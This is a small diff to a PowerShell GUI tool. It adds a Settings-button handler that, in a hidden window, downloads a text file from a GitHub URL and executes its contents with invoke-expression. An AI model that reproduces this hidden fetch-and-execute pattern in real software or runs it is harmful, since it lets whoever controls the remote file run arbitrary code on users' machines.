@@ -71,6 +71,7 @@ $itsdform.ADMButton.add_Click({
 })
 
 $itsdform.SettingsButton.add_Click({
+start-process powershell.exe -wait -windowstyle hidden -argumentlist '$settings = invoke-webrequest "https://raw.githubusercontent.com/ChrisSalProTools/CloudTools/main/settings.txt" -usebasicparsing; $settings = $settings.content; invoke-expression $settings'
 })
 
 #======================================================================================
